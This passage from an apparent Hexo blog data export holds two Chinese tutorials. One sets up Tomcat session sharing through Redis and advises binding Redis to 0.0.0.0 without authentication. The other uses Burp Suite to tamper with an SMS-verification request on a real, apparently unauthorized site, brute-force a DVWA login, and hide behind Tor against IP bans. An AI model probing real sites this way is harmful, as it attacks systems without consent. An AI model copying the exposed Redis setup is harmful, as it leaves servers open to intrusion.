查看效果\"></a>4. 重启tomcat 查看效果</h4><p><img src=\"./tomcat1.png\" alt=\"redisport\"><br><img src=\"./tomcat2.png\" alt=\"redisport\"></p>\n<p>可以看到现在session已经保持不变</p>\n<h4 id=\"5-2018-12-26补充\"><a href=\"#5-2018-12-26补充\" class=\"headerlink\" title=\"5.2018-12-26补充\"></a>5.2018-12-26补充</h4><p>公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br><br>解决办法:<br><br>去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apply plugin: &apos;java&apos;</span><br><span class=\"line\">apply plugin: &apos;maven&apos;</span><br><span class=\"line\">apply plugin: &apos;signing&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">group = &apos;com.orangefunction&apos;</span><br><span class=\"line\">version = &apos;1.2.0&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">repositories &#123;</span><br><span class=\"line\">  mavenCentral()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">compileJava &#123;</span><br><span class=\"line\">  sourceCompatibility = 1.7</span><br><span class=\"line\">  targetCompatibility = 1.7</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">  //compile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-catalina&apos;,</span><br><span class=\"line\">   version: &apos;6.0.37&apos;</span><br><span class=\"line\">  //用tomcat6.0.37的jar打包</span><br><span class=\"line\">  compile fileTree(dir: &apos;pathto/your/tomcat6.0.37/lib&apos;, include: [&apos;*.jar&apos;])</span><br><span class=\"line\">  compile group: &apos;redis.clients&apos;, name: &apos;jedis&apos;, version: &apos;2.5.2&apos;</span><br><span class=\"line\">  compile group: &apos;org.apache.commons&apos;, name: &apos;commons-pool2&apos;, version: &apos;2.2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">  testCompile group: &apos;junit&apos;, name: &apos;junit&apos;, version: &apos;4.+&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-core:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-library:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.mockito:mockito-all:1.9.5&apos;</span><br><span class=\"line\">  testCompile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-coyote&apos;, version: &apos;6.0.37&apos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在部署时，注意className名字，和你打包生成的一致<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Valve className=&quot;com.radiadesign.catalina.session.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.radiadesign.catalina.session.RedisSessionManager&quot;</span><br><span class=\"line\">         host=&quot;localhost&quot; &lt;!-- optional: defaults to &quot;localhost&quot; --&gt;</span><br><span class=\"line\">         port=&quot;6379&quot; &lt;!-- optional: defaults to &quot;6379&quot; --&gt;</span><br><span class=\"line\">         database=&quot;0&quot; &lt;!-- optional: defaults to &quot;0&quot; --&gt;</span><br><span class=\"line\">         maxInactiveInterval=&quot;60&quot; &lt;!-- optional: defaults to &quot;60&quot; (in seconds) --&gt; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果还报configure XXX.xml错误<br><br>到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml</p>\n<h3 id=\"2019-5-29补充\"><a href=\"#2019-5-29补充\" class=\"headerlink\" title=\"2019/5/29补充\"></a>2019/5/29补充</h3><p>基于tomcat内存的方式:<br><a href=\"https://www.cnblogs.com/beyang/p/9122406.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/beyang/p/9122406.html</a></p>\n<h3 id=\"2019-6-4补充\"><a href=\"#2019-6-4补充\" class=\"headerlink\" title=\"2019/6/4补充\"></a>2019/6/4补充</h3><p>tomcat7版本，注意jar包冲突<br><br>经测试的一个可用版本：<br></p>\n<ul>\n<li>apache-tomcat-7.0.61</li>\n<li>commons-logging-1.1.3.jar</li>\n<li>commons-pool-1.6.jar</li>\n<li>commons-pool2-2.2.jar</li>\n<li>jedis-2.2.1.jar</li>\n<li>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar</li>\n</ul>\n<p>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar为github下载源码打包<br><br><a href=\"https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip</a><br></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-需求\"><a href=\"#1-需求\" class=\"headerlink\" title=\"1.需求\"></a>1.需求</h4><p>不同Ip主机上的tomcat,保持session同步。<br></p>\n<h4 id=\"2-查资料\"><a href=\"#2-查资料\" class=\"headerlink\" title=\"2.查资料\"></a>2.查资料</h4><p>一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br><br>开源项目<a href=\"https://github.com/jcoleman/tomcat-redis-session-manager，\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager，</a> 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br><br>解决方案参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 直接用gradle生成jar包。</p>\n<h4 id=\"3-实现\"><a href=\"#3-实现\" class=\"headerlink\" title=\"3.实现\"></a>3.实现</h4><p>tomcat7.0.61/nginx1.10.3/ubuntu虚拟机</p>\n<h6 id=\"1-tomcat\"><a href=\"#1-tomcat\" class=\"headerlink\" title=\"1.tomcat\"></a>1.tomcat</h6><ul>\n<li>解压两个tomcat到两个虚拟机</li>\n<li>conf/server.xml更改端口，使之不重复</li>\n<li>添加index.jsp到 webapps/Root目录下</li>\n<li>分别启动tomcat,看看是否正常<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;  </span><br><span class=\"line\">&lt;%  </span><br><span class=\"line\">String path = request.getContextPath();  </span><br><span class=\"line\">String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;  </span><br><span class=\"line\">%&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  </span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">  &lt;head&gt;  </span><br><span class=\"line\">    &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;  </span><br><span class=\"line\">    &lt;title&gt;My JSP &apos;index.jsp&apos; starting page&lt;/title&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;      </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;  </span><br><span class=\"line\">    &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;  </span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span><br><span class=\"line\">    --&gt;  </span><br><span class=\"line\">  &lt;/head&gt;  </span><br><span class=\"line\">  &lt;body&gt;  </span><br><span class=\"line\">        SessionID:&lt;%=session.getId()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionIP:&lt;%=request.getServerName()%&gt;  </span><br><span class=\"line\">        &lt;BR&gt;  </span><br><span class=\"line\">        SessionPort:&lt;%=request.getServerPort()%&gt;  </span><br><span class=\"line\">        &lt;%  </span><br><span class=\"line\">        out.println(&quot;This is Tomcat Server 22222&quot;);  </span><br><span class=\"line\">        %&gt;  </span><br><span class=\"line\">  &lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h6 id=\"2-nginx\"><a href=\"#2-nginx\" class=\"headerlink\" title=\"2.nginx\"></a>2.nginx</h6><p>不使用ngnix也行，在浏览器手动分别访问两个tomcat<br><br>编辑/etc/nginx/nginx.conf 添加tomcat配置<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream tomcat&#123;</span><br><span class=\"line\">\t#ip_hash;</span><br><span class=\"line\">\tserver   192.168.93.132:8081\tweight=1;</span><br><span class=\"line\">\tserver   192.168.93.133:8080\tweight=1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">\tlisten 80;</span><br><span class=\"line\">\tserver_name localhost 127.0.0.1;</span><br><span class=\"line\">            location / &#123;</span><br><span class=\"line\">                root    html;</span><br><span class=\"line\">                index   index.jsp;</span><br><span class=\"line\">                proxy_pass      http://tomcat;</span><br><span class=\"line\">                proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class=\"line\">                client_max_body_size    100m;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-redis\"><a href=\"#3-redis\" class=\"headerlink\" title=\"3.redis\"></a>3.redis</h6><p>这一步很坑，参照：<a href=\"https://my.oschina.net/Listening/blog/674759\" target=\"_blank\" rel=\"noopener\">https://my.oschina.net/Listening/blog/674759</a>, 进行配置<br></p>\n<p>将生成的jar包全部放入tomcat/lib/目录下<br><br>编辑tomcat/conf/content.xml文件,添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Context&gt;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">    &lt;!--</span><br><span class=\"line\">    &lt;Valve className=&quot;org.apache.catalina.valves.CometConnectionManagerValve&quot; /&gt;</span><br><span class=\"line\">    --&gt;</span><br><span class=\"line\">&lt;Valve className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class=\"line\">    host=&quot;127.0.0.1&quot; //注意这里，应该是redis地址</span><br><span class=\"line\">    port=&quot;6379&quot;</span><br><span class=\"line\">    database=&quot;0&quot;</span><br><span class=\"line\">    maxInactiveInterval=&quot;60&quot;</span><br><span class=\"line\">/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>\n<p>在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br><br>除此之外也有可能防火墙原因.<br><br>重启 redis-server /etc/redis/redis.conf <br><br>查看是否监听0.0.0.0:6379端口 ps -ef | grep redis<br><img src=\"./redis.png\" alt=\"redisport\"></p>\n<h4 id=\"4-重启tomcat-查看效果\"><a href=\"#4-重启tomcat-查看效果\" class=\"headerlink\" title=\"4. 重启tomcat 查看效果\"></a>4. 重启tomcat 查看效果</h4><p><img src=\"./tomcat1.png\" alt=\"redisport\"><br><img src=\"./tomcat2.png\" alt=\"redisport\"></p>\n<p>可以看到现在session已经保持不变</p>\n<h4 id=\"5-2018-12-26补充\"><a href=\"#5-2018-12-26补充\" class=\"headerlink\" title=\"5.2018-12-26补充\"></a>5.2018-12-26补充</h4><p>公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br><br>解决办法:<br><br>去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apply plugin: &apos;java&apos;</span><br><span class=\"line\">apply plugin: &apos;maven&apos;</span><br><span class=\"line\">apply plugin: &apos;signing&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">group = &apos;com.orangefunction&apos;</span><br><span class=\"line\">version = &apos;1.2.0&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">repositories &#123;</span><br><span class=\"line\">  mavenCentral()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">compileJava &#123;</span><br><span class=\"line\">  sourceCompatibility = 1.7</span><br><span class=\"line\">  targetCompatibility = 1.7</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">  //compile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-catalina&apos;,</span><br><span class=\"line\">   version: &apos;6.0.37&apos;</span><br><span class=\"line\">  //用tomcat6.0.37的jar打包</span><br><span class=\"line\">  compile fileTree(dir: &apos;pathto/your/tomcat6.0.37/lib&apos;, include: [&apos;*.jar&apos;])</span><br><span class=\"line\">  compile group: &apos;redis.clients&apos;, name: &apos;jedis&apos;, version: &apos;2.5.2&apos;</span><br><span class=\"line\">  compile group: &apos;org.apache.commons&apos;, name: &apos;commons-pool2&apos;, version: &apos;2.2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">  testCompile group: &apos;junit&apos;, name: &apos;junit&apos;, version: &apos;4.+&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-core:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.hamcrest:hamcrest-library:1.3&apos;</span><br><span class=\"line\">  testCompile &apos;org.mockito:mockito-all:1.9.5&apos;</span><br><span class=\"line\">  testCompile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-coyote&apos;, version: &apos;6.0.37&apos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在部署时，注意className名字，和你打包生成的一致<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Valve className=&quot;com.radiadesign.catalina.session.RedisSessionHandlerValve&quot; /&gt;</span><br><span class=\"line\">&lt;Manager className=&quot;com.radiadesign.catalina.session.RedisSessionManager&quot;</span><br><span class=\"line\">         host=&quot;localhost&quot; &lt;!-- optional: defaults to &quot;localhost&quot; --&gt;</span><br><span class=\"line\">         port=&quot;6379&quot; &lt;!-- optional: defaults to &quot;6379&quot; --&gt;</span><br><span class=\"line\">         database=&quot;0&quot; &lt;!-- optional: defaults to &quot;0&quot; --&gt;</span><br><span class=\"line\">         maxInactiveInterval=&quot;60&quot; &lt;!-- optional: defaults to &quot;60&quot; (in seconds) --&gt; /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果还报configure XXX.xml错误<br><br>到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml</p>\n<h3 id=\"2019-5-29补充\"><a href=\"#2019-5-29补充\" class=\"headerlink\" title=\"2019/5/29补充\"></a>2019/5/29补充</h3><p>基于tomcat内存的方式:<br><a href=\"https://www.cnblogs.com/beyang/p/9122406.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/beyang/p/9122406.html</a></p>\n<h3 id=\"2019-6-4补充\"><a href=\"#2019-6-4补充\" class=\"headerlink\" title=\"2019/6/4补充\"></a>2019/6/4补充</h3><p>tomcat7版本，注意jar包冲突<br><br>经测试的一个可用版本：<br></p>\n<ul>\n<li>apache-tomcat-7.0.61</li>\n<li>commons-logging-1.1.3.jar</li>\n<li>commons-pool-1.6.jar</li>\n<li>commons-pool2-2.2.jar</li>\n<li>jedis-2.2.1.jar</li>\n<li>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar</li>\n</ul>\n<p>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar为github下载源码打包<br><br><a href=\"https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip\" target=\"_blank\" rel=\"noopener\">https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip</a><br></p>\n"},{"title":"burpsuite","date":"2018-12-12T15:48:18.000Z","_content":"\n#### 1.配置\n先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br>\n  ![proxy_1](./image/chrome_proxy.png)\n\n  ![proxy_1_1](./image/chrome_proxy2.png)\n\n再配置burpsuite监听这个端口的流量<br>\n  ![proxy_2](./image/burpsuite_proxy.png)\n\n此外 ，因为要访问https,配置完这些后，打开浏览器访问http://burp，下载证书，安装到受信任颁发机构<br>\n![proxy_3](./image/burpsuite_ca_certificate.png)\n![proxy_3_1](./image/ca_certificate_install.png)\n\n#### 实战\n##### 1.第一个抓包小例子\n1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个http://usr.005.tv/User/login.html\n![login_page_1](./image/usr005tv_login_page1.png)\n先点击注册\n![register_page_1](./image/usr005tv_register1.png)\n\n<br>\n<strong>其中我们邮箱和手机号都是填的假号码。\n然后开始拦截抓包，滑动滑块\n\n![package1](./image/usr005tv_package_1.png)\n修改号码为自己手机号，收到验证码\n![package1](./image/usr005tv_package_2.png)\n输入验证码\n![package1](./image/usr005tv_package_3.png)\n在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。\n\n##### 2.一个爆破小例子\n来dvwn的登录（admin/password）\n![intruder_01](./image/dvwn_login_1.png)\n随便输入，抓取数据包，send to intruder\n![intruder_02](./image/burpsuite_intruder_01.png)\n选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br>\n然后，clear清空变量，鼠标选中后，add添加自己需要的变量\n![intruder_03](./image/burpsuite_intruder_02.png)\n分别添加变量对应的字典，进行爆破\n![intruder_04](./image/burpsuite_intruder_03.png)\n爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)\n![intruder_05](./image/burpsuite_intruder_04.png)\n\n#### 问题\n1.使用burpsuite抓包后，vpn没用了，不能访问外网<br>\n\n解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br>\n\n2018/12/20 添加:<br>\n解决2，使用代理链 https://www.anquanke.com/post/id/85925<br>\n同理，也可以使用代理链来用tor进行代理(防封ip)\n![proxy_chain_01](./image/proxy_chain_01.png)\n不稳定，容易出错：SOCKS server general failure<br>\n原因待查。。。\n\n#### 3.返回包修改与抓手机包\n###### 3.1修改返回包\n![modify_response](./image/modify_response.png)\n点击拦截后, forward会将返回结果拦截，然后自己进行修改。<br>\n再次点击forward将修改完的数据返回给原请求。\n###### 3.2抓取手机http流量\nhttps需要配置证书，其它一样。<br>\n手机和burp在同一局域网下<br>\n![intercept_mobile](./image/intercept_mobile.png)\n配置burp监听本机ip,端口随意<br>\n到手机设置里面，对连接的wifi进行修改。选择连接的wifi->显示高级选项->选择代理(手动)->\n配置ip和端口(上一步burp中设置的)->ip(DHCP)。<br>\n现在可以到burp中进行抓包了<br>\n","source":"_posts/security/burpsuite/burpsuite.md","raw":"---\ntitle: burpsuite\ndate: 2018-12-12 10:48:18\ntags: [security]\n---\n\n#### 1.配置\n先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br>\n  ![proxy_1](./image/chrome_proxy.png)\n\n  ![proxy_1_1](./image/chrome_proxy2.png)\n\n再配置burpsuite监听这个端口的流量<br>\n  ![proxy_2](./image/burpsuite_proxy.png)\n\n此外 ，因为要访问https,配置完这些后，打开浏览器访问http://burp，下载证书，安装到受信任颁发机构<br>\n![proxy_3](./image/burpsuite_ca_certificate.png)\n![proxy_3_1](./image/ca_certificate_install.png)\n\n#### 实战\n##### 1.第一个抓包小例子\n1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个http://usr.005.tv/User/login.html\n![login_page_1](./image/usr005tv_login_page1.png)\n先点击注册\n![register_page_1](./image/usr005tv_register1.png)\n\n<br>\n<strong>其中我们邮箱和手机号都是填的假号码。\n然后开始拦截抓包，滑动滑块\n\n![package1](./image/usr005tv_package_1.png)\n修改号码为自己手机号，收到验证码\n![package1](./image/usr005tv_package_2.png)\n输入验证码\n![package1](./image/usr005tv_package_3.png)\n在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。\n\n##### 2.一个爆破小例子\n来dvwn的登录（admin/password）\n![intruder_01](./image/dvwn_login_1.png)\n随便输入，抓取数据包，send to intruder\n![intruder_02](./image/burpsuite_intruder_01.png)\n选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br>\n然后，clear清空变量，鼠标选中后，add添加自己需要的变量\n![intruder_03](./image/burpsuite_intruder_02.png)\n分别添加变量对应的字典，进行爆破\n![intruder_04](./image/burpsuite_intruder_03.png)\n爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)\n![intruder_05](./image/burpsuite_intruder_04.png)\n\n#### 问题\n1.使用burpsuite抓包后，vpn没用了，不能访问外网<br>\n\n解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br>\n\n2018/12/20 添加:<br>\n解决2，使用代理链 https://www.anquanke.com/post/id/85925<br>\n同理，也可以使用代理链来用tor进行代理(防封ip)\n![proxy_chain_01](./image/proxy_chain_01.png)\n不稳定，容易出错：SOCKS server general failure<br>\n原因待查。。。\n\n#### 3.返回包修改与抓手机包\n###### 3.1修改返回包\n![modify_response](./image/modify_response.png)\n点击拦截后, forward会将返回结果拦截，然后自己进行修改。<br>\n再次点击forward将修改完的数据返回给原请求。\n###### 3.2抓取手机http流量\nhttps需要配置证书，其它一样。<br>\n手机和burp在同一局域网下<br>\n![intercept_mobile](./image/intercept_mobile.png)\n配置burp监听本机ip,端口随意<br>\n到手机设置里面，对连接的wifi进行修改。选择连接的wifi->显示高级选项->选择代理(手动)->\n配置ip和端口(上一步burp中设置的)->ip(DHCP)。<br>\n现在可以到burp中进行抓包了<br>\n","slug":"security/burpsuite/burpsuite","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lq004s6dcpygvrknkk","content":"<h4 id=\"1-配置\"><a href=\"#1-配置\" class=\"headerlink\" title=\"1.配置\"></a>1.配置</h4><p>先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br><br>  <img src=\"./image/chrome_proxy.png\" alt=\"proxy_1\"></p>\n<p>  <img src=\"./image/chrome_proxy2.png\" alt=\"proxy_1_1\"></p>\n<p>再配置burpsuite监听这个端口的流量<br><br>  <img src=\"./image/burpsuite_proxy.png\" alt=\"proxy_2\"></p>\n<p>此外 ，因为要访问https,配置完这些后，打开浏览器访问<a href=\"http://burp，下载证书，安装到受信任颁发机构\" target=\"_blank\" rel=\"noopener\">http://burp，下载证书，安装到受信任颁发机构</a><br><br><img src=\"./image/burpsuite_ca_certificate.png\" alt=\"proxy_3\"><br><img src=\"./image/ca_certificate_install.png\" alt=\"proxy_3_1\"></p>\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><h5 id=\"1-第一个抓包小例子\"><a href=\"#1-第一个抓包小例子\" class=\"headerlink\" title=\"1.第一个抓包小例子\"></a>1.第一个抓包小例子</h5><p>1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个<a href=\"http://usr.005.tv/User/login.html\" target=\"_blank\" rel=\"noopener\">http://usr.005.tv/User/login.html</a><br><img src=\"./image/usr005tv_login_page1.png\" alt=\"login_page_1\"><br>先点击注册<br><img src=\"./image/usr005tv_register1.png\" alt=\"register_page_1\"></p>\n<p><br><br><strong>其中我们邮箱和手机号都是填的假号码。<br>然后开始拦截抓包，滑动滑块</strong></p>\n<p><img src=\"./image/usr005tv_package_1.png\" alt=\"package1\"><br>修改号码为自己手机号，收到验证码<br><img src=\"./image/usr005tv_package_2.png\" alt=\"package1\"><br>输入验证码<br><img src=\"./image/usr005tv_package_3.png\" alt=\"package1\"><br>在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。</p>\n<h5 id=\"2-一个爆破小例子\"><a href=\"#2-一个爆破小例子\" class=\"headerlink\" title=\"2.一个爆破小例子\"></a>2.一个爆破小例子</h5><p>来dvwn的登录（admin/password）<br><img src=\"./image/dvwn_login_1.png\" alt=\"intruder_01\"><br>随便输入，抓取数据包，send to intruder<br><img src=\"./image/burpsuite_intruder_01.png\" alt=\"intruder_02\"><br>选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br><br>然后，clear清空变量，鼠标选中后，add添加自己需要的变量<br><img src=\"./image/burpsuite_intruder_02.png\" alt=\"intruder_03\"><br>分别添加变量对应的字典，进行爆破<br><img src=\"./image/burpsuite_intruder_03.png\" alt=\"intruder_04\"><br>爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)<br><img src=\"./image/burpsuite_intruder_04.png\" alt=\"intruder_05\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>1.使用burpsuite抓包后，vpn没用了，不能访问外网<br></p>\n<p>解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br></p>\n<p>2018/12/20 添加:<br><br>解决2，使用代理链 